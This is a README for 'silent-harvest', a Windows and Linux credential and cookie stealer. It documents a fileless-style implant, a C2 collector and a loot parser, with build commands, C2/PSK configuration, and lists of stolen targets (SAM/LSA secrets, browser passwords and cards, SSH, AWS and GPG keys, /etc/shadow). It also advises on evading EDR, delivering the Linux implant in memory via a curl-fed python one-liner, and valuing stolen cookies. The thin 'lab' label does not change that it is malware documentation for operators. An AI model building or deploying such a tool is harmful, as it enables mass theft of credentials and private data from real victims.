# silent-harvest

A stealthy Windows credential & cookie harvester: operator-side collector,
fileless implant, encrypted exfil. Implements the "Silent Harvest" registry
technique (SeBackupPrivilege + `NtOpenKeyEx(REG_OPTION_BACKUP_RESTORE)` +
`RegQueryMultipleValuesW`) for SAM/LSA material, full browser artifact
harvesting (Chromium family + Firefox), and AES-256-GCM encrypted exfil over
a single HTTP POST.

```
implant (victim)                     collector (operator)
┌──────────────────────────┐         ┌────────────────────────────┐
│ 1 SeBackupPrivilege      │         │ python collector.py        │
│ 2 NtOpenKeyEx backup-    │  HTTP   │   /gate  <- SHV1 container │
│   restore + multi-read   │ ──────> │ python parse_loot.py       │
│   SAM/SECURITY/LSA       │  AEAD   │   hives -> secretsdump     │
│ 3 VSS hive copies        │         │   cookies/passwords/cards  │
│ 4 browsers + DPAPI keys  │         │   firefox key4/logins      │
│ 5 handle-dup locked DBs  │         │   report.txt + creds.json  │
└──────────────────────────┘         └────────────────────────────┘
```

## Layout

| path | what |
|---|---|
| `implant/*.cs` | C# implant (C#5, builds with the in-box `csc.exe` — no toolchain needed) |
| `build.bat` | builds debug console exe + release GUI exe; bakes C2/PSK into `Config.cs`, mirrors PSK to `server/psk.txt` |
| `linux/sh_harvest.py` | Linux implant: single-file python3, stdlib only (AES-GCM via `cryptography` or ctypes-libcrypto), same SHV1 container |
| `server/collector.py` | threaded loot receiver: verifies + decrypts + stores per-victim bundles |
| `server/parse_loot.py` | turns bundles into `report.txt`, `creds.json`, Netscape cookie files, optional secretsdump |
| `server/shcrypto.py` | container format (shared, mirrors `implant/Crypto.cs` and `linux/sh_harvest.py`) |
| `test/` | synthetic round-trip tests (firefox key4/logins.json, chromium v10 windows, chromium/linux full) + debug probes |
| `docs/TECHNIQUES.md` | per-stage technique/ATT&CK mapping + detection notes |

## Quick start (lab)

```bat
:: 1. build (defaults: C2 http://127.0.0.1:8443/gate, dev PSK)
build.bat

:: or with your own C2 + PSK:
build.bat /name updater.exe /c2 http://your.host:8443/gate /psk LONGRANDOMSECRET
```

```bash
# 2. collector (same PSK the implant was built with)
cd server
python collector.py --port 8443            # reads psk.txt written by build.bat
#                                          # or: --psk LONGRANDOMSECRET / env SH_PSK

# 3. run the implant on a test box (debug build logs stages to console)
../build/sh_debug.exe                      # default C2 from build time
../build/sh_debug.exe --c2 http://127.0.0.1:8443/gate --only brow
../build/sh_debug.exe --out loot.bin       # offline mode: write container to disk

# 4. parse what landed
python parse_loot.py                       # newest bundle under ../loot
python parse_loot.py --bundle file.bin     # standalone container
```

### Implant flags (both builds)

| flag | effect |
|---|---|
| `--c2 URL` | override C2 endpoint for this run |
| `--out FILE` | write container to disk instead of POSTing |
| `--psk KEY` | override pre-shared key |
| `--only reg,hive,brow` | run a subset of stages |
| `--wait MS` | sleep before running (jitter) |

The release build is a GUI-subsystem exe: no console, no stdout, single run
then exit. If the C2 is unreachable the container is dropped to
`%TEMP%\sh_<host>_<ts>.bin` for later retrieval.

## Linux implant

`linux/sh_harvest.py` — drop it on any Linux box with python3:

```bash
# against the baked defaults
python3 sh_harvest.py

# everything overridable via args or env
SH_C2=http://your.host:8443/gate SH_PSK=LONGRANDOMSECRET python3 sh_harvest.py -v
python3 sh_harvest.py --only brow,keys --out loot.bin   # offline mode
python3 sh_harvest.py --selftest                        # crypto/container check
```

Stages:

| stage | collects |
|---|---|
| `brow` | Chromium family (`~/.config/{google-chrome,chromium,microsoft-edge,BraveSoftware,vivaldi,opera}`): Cookies/Login Data/Web Data; best-effort `secret-tool` lookup of the keyring os_crypt password (v1+v2 schemas); Firefox/LibreWolf/Thunderbird key4.db + logins |
| `keys` | `~/.ssh/*`, `~/.gnupg/private-keys-v1.d/*`, `~/.aws/*`, `~/.netrc`, `~/.git-credentials`, `~/.docker/config.json`, `~/.kube`, NetworkManager profiles, `/etc/shadow`+`/etc/passwd` (root), shell-history tails |
| `keyring` | raw `~/.local/share/keyring/*` files for offline work |

Same SHV1 container and collector. Server-side decryption is platform-aware:
Linux Chromium v10/v11 blobs use PBKDF2-HMAC-SHA1(password, `"saltysalt"`, 1
iter, 16B) → AES-128-CBC with a 16-space IV — password from the exfiltrated
keyring value when available, else the `"peanuts"` fallback. Verified
end-to-end (synthetic home + live HTTP exfil) in `test/synth_linux.py`.

Stealth note: a `.py` file is more audible than the Windows release exe
(python3 shebang execution, plaintext script on disk). If that matters,
deliver it memory-backed (`python3 -c "$(curl ...)"`, base64 blob in a
launcher, or freeze to ELF with pyinstaller on your build box).

## What each stage collects

| stage | unelevated user | elevated (SeBackupPrivilege) |
|---|---|---|
| registry (`regvals.json`) | bootkey class components (JD/Skew1/GBG/Data), real OS version; SAM/SECURITY report `STATUS_ACCESS_DENIED` | + SAM account `F`/`V` values per RID, LSA secrets (`SECURITY\Policy\Secrets\*\CurrVal`), cached domain logons (`SECURITY\Cache\NL$1..10`) |
| hives | skipped | SAM/SECURITY/SYSTEM hive copies via `esentutl /y /vss` (temp file deleted after read) |
| browsers | Local State + DPAPI-unwrapped os_crypt AES key, Cookies/Login Data/Web Data copies, Firefox key4.db/logins.json/logins.db | + VSS fallback for locked files |
| handle-dup | live-locked DBs (Chrome's running Cookies DB) read by duplicating the owner's own file handle | same |

The parser assembles the **syskey bootkey** from the four class components and
feeds exfiltrated hives to impacket's `secretsdump` when installed
(`pip install impacket`), producing NT hashes/DCC2/LSA secrets offline.

## Crypto between implant and collector

- Container: `SHV1 | ver | salt16 | nonce12 | len8 | ciphertext | tag16`
- Key: HKDF-SHA256(PSK, salt, info=`silent-harvest/v1`, 32B)
- AEAD: AES-256-GCM, AAD = header. Only the 6-byte header is visible on the wire.
- Implant side is raw CNG (`BCrypt*`) — no .NET crypto assemblies loaded.

## Known limits (read this)

1. **Chrome/Brave/Edge ≥127 app-bound encryption (v11, and the 2025 v20
   generation).** Cookies/passwords encrypted under `v11`/`v20` blobs cannot
   be decrypted with the os_crypt key by design. The implant still exfiltrates
   the DBs, the os_crypt key, and the raw `app_bound_encrypted_key` blob
   (`b:<browser>/ABEblob.bin`) for offline/SYSTEM-context processing
   (elevation-service COM path). v10-era data and autofill/credit cards
   decrypt fine — verified by `test/synth_chromium.py`. On this build box all
   live cookies were v20 and are reported as `app-bound v11/v20=N`.
   On **Linux** the equivalent generation (`v20`) is also app-bound, but
   classic v10/v11 (the vast majority of installs) decrypt fully — verified in
   `test/synth_linux.py`.
2. **DBSC (Chrome ≥145, Device Bound Session Credentials).** Sites enrolled
   in DBSC bind sessions to TPM-held keys, so a stolen cookie for those sites
   cannot be replayed from another device — it may still be *read* (the
   cookie value decrypts) but replay dies at the next DBSC handshake. Budget
   for this when valuing cookie loot.
3. **SAM/LSA/hives need elevation.** The backup-intent open is checked for
   `SeBackupPrivilege` by the kernel, so unelevated runs only get the
   readable-SYSTEM material (bootkey components). Run from an elevated
   context for hashes/LSA secrets. There is deliberately no UAC prompt —
   it harvests what the current token allows and reports the rest as
   access-denied. Linux `/etc/shadow` + NetworkManager psk likewise need root.
4. **CLR visibility.** A .NET implant loads the CLR — more visible to EDR
   than native code. The rare-API registry path and handle-dup file reads are
   the low-noise parts. Native port is the natural next step (the C# is
   structured P/Invoke-first for exactly that reason).
5. **Firefox new LoginStore** (`logins.db` with `loginsL/loginsM` tables):
   `secFields` are exfiltrated raw (encrypted JSON, Rust sync store format).
   Classic `key4.db` a11 + `logins.json` decrypt fully (verified
   synthetically + against a real key4.db structure).
6. **Linux keyring**: the implant reads keyring files raw and pulls the
   chromium password via `secret-tool` when the session keyring is unlocked;
   a locked keyring (or no `secret-tool`) falls back to `"peanuts"` and flags
   it in the report.

## Tests

```bash
cd server && python shcrypto.py            # container pack/unpack + PSK rejection
cd test   && python synth_firefox.py       # key4 ASN.1/KDF/a11/3DES round-trip
cd test   && python synth_chromium.py      # v10 cookie/login/card/autofill round-trip
cd test   && python synth_linux.py         # linux implant over synthetic home + parser
```

Everything else in this README was verified live on the build box (see
`docs/TECHNIQUES.md` for what was observed end-to-end).
